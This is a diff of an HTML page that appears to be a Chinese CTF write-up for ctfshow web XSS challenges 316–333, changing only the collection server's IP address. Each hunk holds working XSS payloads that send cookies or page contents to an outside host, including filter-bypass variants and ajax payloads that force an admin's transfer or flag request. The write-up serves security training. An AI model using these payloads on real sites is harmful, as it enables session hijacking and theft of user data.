@@ -354,7 +354,7 @@ if(isset($content))&#123;
 <pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">php -S 0.0.0.0:8080</code></pre>
 
 <p>接着使用这个 payload 发送上去，bot 就会触发这个，将 cookie 给到 vps</p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;index.php?cookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;</code></pre>
+<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;192.168.11.42:8080&#x2F;index.php?cookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;</code></pre>
 
 <blockquote>
 <p><code>location.href</code> ：将页面重定向到后面的 url</p>
@@ -366,7 +366,7 @@ if(isset($content))&#123;
 <pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;img src&#x3D;&quot;&quot; onerror&#x3D;alert(&quot;1&quot;)&gt;</code></pre>
 
 <p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250731175210-20260228215258-m8x2vl1.png" alt="image"></p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;img src&#x3D;&quot;&quot; onerror&#x3D;location.href&#x3D;&quot;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;index.php?cookie&#x3D;&quot;+document.cookie&gt;</code></pre>
+<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;img src&#x3D;&quot;&quot; onerror&#x3D;location.href&#x3D;&quot;http:&#x2F;&#x2F;192.168.11.42:8080&#x2F;index.php?cookie&#x3D;&quot;+document.cookie&gt;</code></pre>
 
 <p>成功</p>
 <p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250731175405-20260228215258-8s1gut6.png" alt="image"></p>
@@ -376,7 +376,7 @@ if(isset($content))&#123;
 <pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;body onload&#x3D;alert(&quot;1&quot;)&gt;</code></pre>
 
 <p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250731200914-20260228215259-ntgdfml.png" alt="image"></p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;body onload&#x3D;location.href&#x3D;&quot;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;index.php?cookie&#x3D;&quot;+document.cookie&gt;</code></pre>
+<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;body onload&#x3D;location.href&#x3D;&quot;http:&#x2F;&#x2F;192.168.11.42:8080&#x2F;index.php?cookie&#x3D;&quot;+document.cookie&gt;</code></pre>
 
 <p>成功拿到<br>这里突然发现，好像都不用写 php ，直接在 url 里看就行（</p>
 <p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250731201032-20260228215259-nsjm0qj.png" alt="image"></p>
@@ -390,11 +390,11 @@ if(isset($content))&#123;
 </blockquote>
 <p>所以这个就相当于</p>
 <pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;body οnlοad&#x3D;document.write(String.fromCharCode(
-&lt;script&gt;document.location.href&#x3D;&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;index.php?cookie&#x3D;&#39;+document.cookie&lt;&#x2F;script&gt;
+&lt;script&gt;document.location.href&#x3D;&#39;http:&#x2F;&#x2F;192.168.11.42:8080&#x2F;index.php?cookie&#x3D;&#39;+document.cookie&lt;&#x2F;script&gt;
 );&gt;</code></pre>
 
 <p>随便写个脚本就行</p>
-<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">code &#x3D; &quot;&lt;script&gt;document.location.href&#x3D;&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;index.php?cookie&#x3D;&#39;+document.cookie&lt;&#x2F;script&gt;&quot;
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">code &#x3D; &quot;&lt;script&gt;document.location.href&#x3D;&#39;http:&#x2F;&#x2F;192.168.11.42:8080&#x2F;index.php?cookie&#x3D;&#39;+document.cookie&lt;&#x2F;script&gt;&quot;
 
 for  i in code :
     asc &#x3D; ord(i)
@@ -408,7 +408,7 @@ for  i in code :
 <p>搞错了，是过滤了空格，使用注释 <code>/**/</code> 来绕过，一些经常用的空格绕过方法好像都行</p>
 <pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;body&#x2F;**&#x2F;onload&#x3D;alert(&quot;1&quot;)&gt;</code></pre>
 
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;body&#x2F;**&#x2F;onload&#x3D;location.href&#x3D;&quot;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;index.php?cookie&#x3D;&quot;+document.cookie&gt;</code></pre>
+<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;body&#x2F;**&#x2F;onload&#x3D;location.href&#x3D;&quot;http:&#x2F;&#x2F;192.168.11.42:8080&#x2F;index.php?cookie&#x3D;&quot;+document.cookie&gt;</code></pre>
 
 <p>‍</p>
 <h3 id="web-321-326"><a href="#web-321-326" class="headerlink" title="web 321-326"></a>web 321-326</h3><p>同上一题，难绷，搞这么多反射型的，但是一个 paylaod 过完了</p>
@@ -416,12 +416,12 @@ for  i in code :
 <h3 id="web-327"><a href="#web-327" class="headerlink" title="web 327"></a>web 327</h3><p>到存储型 XSS 了，这里测试了一会发现一直网络拥堵，还以为不是这个漏洞点，后面看了下 wp 发现是收件人要是 admin ，有点妹想到</p>
 <p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801102206-20260228215259-dtkpe2n.png" alt="image"></p>
 <p>最后用之前的 payload 就行，这题没有过滤什么东西</p>
-<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;index.php?cookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;</code></pre>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;192.168.11.42:8080&#x2F;index.php?cookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;</code></pre>
 
 <p>‍</p>
 <h3 id="web-328"><a href="#web-328" class="headerlink" title="web 328"></a>web 328</h3><p>有一个注册页面，发现在用户管理页面管理员是可以看到用户名的，所以应该是在用户名的地方进行 XSS</p>
 <p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801103029-20260228215259-y9a696e.png" alt="image"></p>
-<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;index.php?cookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;</code></pre>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;192.168.11.42:8080&#x2F;index.php?cookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;</code></pre>
 
 <p>从管理员那里先拿到 cookie</p>
 <p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801103132-20260228215259-yveab68.png" alt="image"></p>
@@ -433,7 +433,7 @@ for  i in code :
 <h3 id="web-329"><a href="#web-329" class="headerlink" title="web 329"></a>web 329</h3><p>这里同样拿到 cookie ，但是好像会马上失效</p>
 <p>这里学到了用 XSS 获取页面的元素</p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&lt;script&gt;
-window.open(&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[2].innerHTML)
+window.open(&#39;http:&#x2F;&#x2F;192.168.11.42:8080&#x2F;&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[2].innerHTML)
 &lt;&#x2F;script&gt;</code></pre>
 
 <blockquote>
@@ -459,7 +459,7 @@ window.open(&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;&#39;+document.getElem
 <pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;script&gt;
 $(&#39;.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;
 	if(value.innerHTML.indexOf(&#39;ctfshow&#123;&#39;)&gt;-1)&#123;
-window.open(&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;&#39;+value.innerHTML);
+window.open(&#39;http:&#x2F;&#x2F;192.168.11.42:8080&#x2F;&#39;+value.innerHTML);
 &#125;&#125;);
 &lt;&#x2F;script&gt;</code></pre>
 
@@ -476,7 +476,7 @@ window.open(&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;&#39;+value.innerHTML)
 </ul>
 <pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;script&gt;
 var img &#x3D; new Image();
-img.src &#x3D; &quot;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;&quot;+document.querySelector(&#39;#top &gt; div.layui-container &gt; div:nth-child(4) &gt; div &gt; div.layui-table-box &gt; div.layui-table-body.layui-table-main&#39;).textContent;
+img.src &#x3D; &quot;http:&#x2F;&#x2F;192.168.11.42:8080&#x2F;&quot;+document.querySelector(&#39;#top &gt; div.layui-container &gt; div:nth-child(4) &gt; div &gt; div.layui-table-box &gt; div.layui-table-body.layui-table-main&#39;).textContent;
 document.body.append(img);
 &lt;&#x2F;script&gt;</code></pre>
 
@@ -490,7 +490,7 @@ document.body.append(img);
 <p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801150211-20260228215300-wntdgqo.png" alt="image"></p>
 <p>使用 <code>outerHTML</code> 测试发现就是没有显示</p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&lt;script&gt;
-window.open(&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;?cookie&#x3D;&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[6].outerHTML)
+window.open(&#39;http:&#x2F;&#x2F;192.168.11.42:8080&#x2F;?cookie&#x3D;&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[6].outerHTML)
 &lt;&#x2F;script&gt;</code></pre>
 
 <p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801150301-20260228215300-poj2iq4.png" alt="image"></p>
@@ -525,14 +525,14 @@ $.ajax(&#123;url:&quot;&#x2F;api&#x2F;change.php&quot;,method:&quot;POST&quot;,d
 <p>这里是转账的请求</p>
 <p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801171854-20260228215301-tt9bwtp.png" alt="image"></p>
 <pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;script&gt;
-$.ajax(&#123;url:&quot;&#x2F;api&#x2F;amount.php&quot;,method:&quot;POST&quot;,data:&#123;&#39;u&#39;:&#39;1&#39;,&#39;a&#39;:&#39;9999&#39;&#125;,success:function(response)&#123;window.open(&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;&#39;+response)&#125;,error:function()&#123;window.open(&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;error&#39;)&#125;&#125;);
+$.ajax(&#123;url:&quot;&#x2F;api&#x2F;amount.php&quot;,method:&quot;POST&quot;,data:&#123;&#39;u&#39;:&#39;1&#39;,&#39;a&#39;:&#39;9999&#39;&#125;,success:function(response)&#123;window.open(&#39;http:&#x2F;&#x2F;192.168.11.42:8080&#x2F;&#39;+response)&#125;,error:function()&#123;window.open(&#39;http:&#x2F;&#x2F;192.168.11.42:8080&#x2F;error&#39;)&#125;&#125;);
 &lt;&#x2F;script&gt;</code></pre>
 
 <p>难绷，拿到了这个还是让我先登录，服了（</p>
 <p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801172105-20260228215301-8cuflu7.png" alt="image"></p>
 <p>那试试让 admin 去拿</p>
 <pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;script&gt;
-$.ajax(&#123;url:&quot;&#x2F;api&#x2F;getFlag.php &quot;,method:&quot;POST&quot;,success:function(response)&#123;window.open(&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;&#39;+response)&#125;,error:function()&#123;window.open(&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;error&#39;)&#125;&#125;);
+$.ajax(&#123;url:&quot;&#x2F;api&#x2F;getFlag.php &quot;,method:&quot;POST&quot;,success:function(response)&#123;window.open(&#39;http:&#x2F;&#x2F;192.168.11.42:8080&#x2F;&#39;+response)&#125;,error:function()&#123;window.open(&#39;http:&#x2F;&#x2F;192.168.11.42:8080&#x2F;error&#39;)&#125;&#125;);
 &lt;&#x2F;script&gt;</code></pre>
 
 <p>得，返回来一个 admin 不需要 flag</p>
@@ -543,7 +543,7 @@ $.ajax(&#123;url:&quot;&#x2F;api&#x2F;getFlag.php &quot;,method:&quot;POST&quot;
 <p>‍</p>
 <h3 id="web-333"><a href="#web-333" class="headerlink" title="web 333"></a>web 333</h3><p>这个好像就是修复了上一题的非预期，但是我的 payload 没有问题</p>
 <pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;script&gt;
-$.ajax(&#123;url:&quot;&#x2F;api&#x2F;amount.php&quot;,method:&quot;POST&quot;,data:&#123;&#39;u&#39;:&#39;23&#39;,&#39;a&#39;:&#39;9999&#39;&#125;,success:function(response)&#123;window.open(&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;&#39;+response)&#125;,error:function()&#123;window.open(&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;error&#39;)&#125;&#125;);
+$.ajax(&#123;url:&quot;&#x2F;api&#x2F;amount.php&quot;,method:&quot;POST&quot;,data:&#123;&#39;u&#39;:&#39;23&#39;,&#39;a&#39;:&#39;9999&#39;&#125;,success:function(response)&#123;window.open(&#39;http:&#x2F;&#x2F;192.168.11.42:8080&#x2F;&#39;+response)&#125;,error:function()&#123;window.open(&#39;http:&#x2F;&#x2F;192.168.11.42:8080&#x2F;error&#39;)&#125;&#125;);
 &lt;&#x2F;script&gt;</code></pre>
 
                 
